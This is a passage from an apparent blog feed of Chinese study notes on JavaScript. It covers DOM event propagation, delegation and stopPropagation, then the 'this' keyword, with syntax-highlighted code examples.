class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">id</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">id</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面两种写法，点击按钮以后也是输出<code>btn</code>。</p><h3 id="0x0103-事件的传播"><a href="#0x0103-事件的传播" class="headerlink" title="0x0103 事件的传播"></a>0x0103 事件的传播</h3><p>一个事件发生后，会在子元素和父元素之间传播（propagation）。这种传播分成三个阶段。</p><ul><li><strong>第一阶段</strong>：从<code>window</code>对象传导到目标节点（上层传到底层），称为“捕获阶段”（capture phase）。</li><li><strong>第二阶段</strong>：在目标节点上触发，称为“目标阶段”（target phase）。</li><li><strong>第三阶段</strong>：从目标节点传导回<code>window</code>对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。</li></ul><p>这种三阶段的传播模型，使得同一个事件会在多个节点上触发。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;div&gt;</code>节点之中有一个<code>&lt;p&gt;</code>节点。</p><p>如果对这两个节点，都设置<code>click</code>事件的监听函数（每个节点的捕获阶段和冒泡阶段，各设置一个监听函数），共计设置四个监听函数。然后，对<code>&lt;p&gt;</code>点击，<code>click</code>事件会触发四次。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> phases = &#123;</span><br><span class="line">  <span class="number">1</span>: <span class="string">&#x27;capture&#x27;</span>,</span><br><span class="line">  <span class="number">2</span>: <span class="string">&#x27;target&#x27;</span>,</span><br><span class="line">  <span class="number">3</span>: <span class="string">&#x27;bubble&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>);</span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">true</span>);</span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);</span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, callback, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> tag = event.<span class="property">currentTarget</span>.<span class="property">tagName</span>;</span><br><span class="line">  <span class="keyword">var</span> phase = phases[event.<span class="property">eventPhase</span>];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Tag: &#x27;&quot;</span> + tag + <span class="string">&quot;&#x27;. EventPhase: &#x27;&quot;</span> + phase + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击以后的结果</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;capture&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;P&#x27;. EventPhase: &#x27;target&#x27;</span></span><br><span class="line"><span class="comment">// Tag: &#x27;DIV&#x27;. EventPhase: &#x27;bubble&#x27;</span></span><br></pre></td></tr></table></figure><p>上面代码表示，<code>click</code>事件被触发了四次：<code>&lt;div&gt;</code>节点的捕获阶段和冒泡阶段各1次，<code>&lt;p&gt;</code>节点的目标阶段触发了2次。</p><ol><li>捕获阶段：事件从<code>&lt;div&gt;</code>向<code>&lt;p&gt;</code>传播时，触发<code>&lt;div&gt;</code>的<code>click</code>事件；</li><li>目标阶段：事件从<code>&lt;div&gt;</code>到达<code>&lt;p&gt;</code>时，触发<code>&lt;p&gt;</code>的<code>click</code>事件；</li><li>冒泡阶段：事件从<code>&lt;p&gt;</code>传回<code>&lt;div&gt;</code>时，再次触发<code>&lt;div&gt;</code>的<code>click</code>事件。</li></ol><p>其中，<code>&lt;p&gt;</code>节点有两个监听函数（<code>addEventListener</code>方法第三个参数的不同，会导致绑定两个监听函数），因此它们都会因为<code>click</code>事件触发一次。所以，<code>&lt;p&gt;</code>会在<code>target</code>阶段有两次输出。</p><p>注意，浏览器总是假定<code>click</code>事件的目标节点，就是点击位置嵌套最深的那个节点（本例是<code>&lt;div&gt;</code>节点里面的<code>&lt;p&gt;</code>节点）。所以，<code>&lt;p&gt;</code>节点的捕获阶段和冒泡阶段，都会显示为<code>target</code>阶段。</p><p>事件传播的最上层对象是<code>window</code>，接着依次是<code>document</code>，<code>html</code>（<code>document.documentElement</code>）和<code>body</code>（<code>document.body</code>）。也就是说，上例的事件传播顺序，在捕获阶段依次为<code>window</code>、<code>document</code>、<code>html</code>、<code>body</code>、<code>div</code>、<code>p</code>，在冒泡阶段依次为<code>p</code>、<code>div</code>、<code>body</code>、<code>html</code>、<code>document</code>、<code>window</code>。</p><h3 id="0x0104-事件的代理"><a href="#0x0104-事件的代理" class="headerlink" title="0x0104 事件的代理"></a>0x0104 事件的代理</h3><p>由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理（delegation）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ul = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ul.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">tagName</span>.<span class="title function_">toLowerCase</span>() === <span class="string">&#x27;li&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// some code</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>click</code>事件的监听函数定义在<code>&lt;ul&gt;</code>节点，但是实际上，它处理的是子节点<code>&lt;li&gt;</code>的<code>click</code>事件。这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，而不用在每个<code>&lt;li&gt;</code>节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。</p><p>如果希望事件到某个节点为止，不再传播，可以使用事件对象的<code>stopPropagation</code>方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 事件传播到 p 元素后，就不再向下传播了</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件冒泡到 p 元素后，就不再向上冒泡了</span></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>stopPropagation</code>方法分别在捕获阶段和冒泡阶段，阻止了事件的传播。</p><p>但是，<code>stopPropagation</code>方法只会阻止事件的传播，不会阻止该事件触发<code>&lt;p&gt;</code>节点的其他<code>click</code>事件的监听函数。也就是说，不是彻底取消<code>click</code>事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 会触发</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>p</code>元素绑定了两个<code>click</code>事件的监听函数。<code>stopPropagation</code>方法只能阻止这个事件的传播，不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是1，然后是2。</p><p>如果想要彻底取消该事件，不再触发后面所有<code>click</code>的监听函数，可以使用<code>stopImmediatePropagation</code>方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopImmediatePropagation</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 不会被触发</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>stopImmediatePropagation</code>方法可以彻底取消这个事件，使得后面绑定的所有<code>click</code>监听函数都不再触发。所以，只会输出1，不会输出2。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 03</title>
      <link href="/2021/09/01/8c49d765b54e-q1jun/"/>
      <url>/2021/09/01/8c49d765b54e-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-03"><a href="#微信小程序学习笔记-03" class="headerlink" title="微信小程序学习笔记 03"></a>微信小程序学习笔记 03</h1><h2 id="0x01-this-关键字"><a href="#0x01-this-关键字" class="headerlink" title="0x01 this 关键字"></a>0x01 this 关键字</h2><p><code>this</code>关键字是一个非常重要的语法点。毫不夸张地说，不理解它的含义，大部分开发任务都无法完成。</p><p>前一章已经提到，<code>this</code>可以用在构造函数之中，表示实例对象。除此之外，<code>this</code>还可以用在别的场合。但不管是什么场合，<code>this</code>都有一个共同点：它总是返回一个对象。</p><p>简单说，<code>this</code>就是属性或方法“当前”所在的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">property</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>this</code>就代表<code>property</code>属性当前所在的对象。</p><p>下面是一个实际的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">describe</span>()</span><br><span class="line"><span class="comment">// &quot;姓名：张三&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>this.name</code>表示<code>name</code>属性所在的那个对象。由于<code>this.name</code>是在<code>describe</code>方法中调用，而<code>describe</code>方法所在的当前对象是<code>person</code>，因此<code>this</code>指向<code>person</code>，<code>this.name</code>就是<code>person.name</code>。</p><p>由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即<code>this</code>的指向是可变的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">B.<span class="property">describe</span> = A.<span class="property">describe</span>;</span><br><span class="line">B.<span class="title function_">describe</span>()</span><br><span class="line"><span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>A.describe</code>属性被赋给<code>B</code>，于是<code>B.describe</code>就表示<code>describe</code>方法所在的当前对象是<code>B</code>，所以<code>this.name</code>就指向<code>B.name</code>。</p><p>稍稍重构这个例子，<code>this</code>的动态指向就能看得更清楚。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;姓名：&#x27;</span>+ <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>,</span><br><span class="line">  <span class="attr">describe</span>: f</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.<span class="title function_">describe</span>() <span class="comment">// &quot;姓名：张三&quot;</span></span><br><span class="line">B.<span class="title function_">describe</span>() <span class="comment">// &quot;姓名：李四&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>f</code>内部使用了<code>this</code>关键字，随着<code>f</code>所在的对象不同，<code>this</code>的指向也不同。</p><p>只要函数被赋给另一个变量，<code>this</code>的指向就会变。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">size</span>=<span class="string">3</span> <span class="attr">onChange</span>=<span class="string">&quot;validate(this, 18, 99);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params">obj, lowval, hival</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> ((obj.<span class="property">value</span> &lt; lowval) || (obj.<span class="property">value</span> &gt; hival))</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Invalid Value!&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码是一个文本输入框，每当用户输入一个值，就会调用<code>onChange</code>回调函数，验证这个值是否在指定范围。浏览器会向回调函数传入当前对象，因此<code>this</code>就代表传入当前对象（即文本框），然后就可以从<code>this.value</code>上面读到用户的输入值。</p><p>总结一下，JavaScript 语言之中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行，<code>this</code>就是函数运行时所在的对象（环境）。这本来并不会让用户糊涂，但是 JavaScript 支持运行环境动态切换，也就是说，<code>this</code>的指向是动态的，没有办法事先确定到底指向哪个对象，这才是最让初学者感到困惑的地方。</p><h3 id="0x0101-this的实质"><a href="#0x0101-this的实质" class="headerlink" title="0x0101 this的实质"></a>0x0101 this的实质</h3><p>JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>:  <span class="number">5</span> &#125;;</span><br></pre></td></tr></table></figure><p>上面的代码将一个对象赋值给变量<code>obj</code>。JavaScript 引擎会先在内存里面，生成一个对象<code>&#123; foo: 5 &#125;</code>，然后把这个对象的内存地址赋值给变量<code>obj</code>。也就是说，变量<code>obj</code>是一个地址（reference）。后面如果要读取<code>obj.foo</code>，引擎先从<code>obj</code>拿到内存地址，然后再从该地址读出原始的对象，返回它的<code>foo</code>属性。</p><p>原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的<code>foo</code>属性，实际上是以下面的形式保存的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">foo</span>: &#123;</span><br><span class="line">    [[value]]: <span class="number">5</span></span><br><span class="line">    [[writable]]: <span class="literal">true</span></span><br><span class="line">    [[enumerable]]: <span class="literal">true</span></span><br><span class="line">    [[configurable]]: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，<code>foo</code>属性的值保存在属性描述对象的<code>value</code>属性里面。</p><p>这样的结构是很清晰的，问题在于属性的值可能是一个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure><p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给<code>foo</code>属性的<code>value</code>属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">foo</span>: &#123;</span><br><span class="line">    [[value]]: 函数的地址</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">f</span>: f &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line"><span class="title function_">f</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.<span class="title function_">f</span>()</span><br></pre></td></tr></table></figure><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p><p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，函数体里面的<code>this.x</code>就是指当前运行环境的<code>x</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">f</span>: f,</span><br><span class="line">  <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单独执行</span></span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// obj 环境执行</span></span><br><span class="line">obj.<span class="title function_">f</span>() <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>f</code>在全局环境执行，<code>this.x</code>指向全局环境的<code>x</code>；在<code>obj</code>环境执行，<code>this.x</code>指向<code>obj.x</code>。</p><h3 id="0x0102-this的使用场合"><a href="#0x0102-this的使用场合" class="headerlink" title="0x0102 this的使用场合"></a>0x0102 this的使用场合</h3><p><code>this</code>主要有以下几个使用场合。</p><p><strong>（1）全局环境</strong></p><p>全局环境使用<code>this</code>，它指的就是顶层对象<code>window</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === <span class="variable language_">window</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>() <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，<code>this</code>就是指顶层对象<code>window</code>。</p><p><strong>（2）构造函数</strong></p><p>构造函数中的<code>this</code>，指的是实例对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Obj</span> = <span class="keyword">function</span> (<span class="params">p</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">p</span> = p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码定义了一个构造函数<code>Obj</code>。由于<code>this</code>指向实例对象，所以在构造函数内部定义<code>this.p</code>，就相当于定义实例对象有一个<code>p</code>属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Obj</span>(<span class="string">&#x27;Hello World!&#x27;</span>);</span><br><span class="line">o.<span class="property">p</span> <span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure><p><strong>（3）对象的方法</strong></p><p>如果对象的方法里面包含<code>this</code>，<code>this</code>的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变<code>this</code>的指向。</p><p>但是，这条规则很不容易把握。请看下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj =&#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">foo</span>() <span class="comment">// 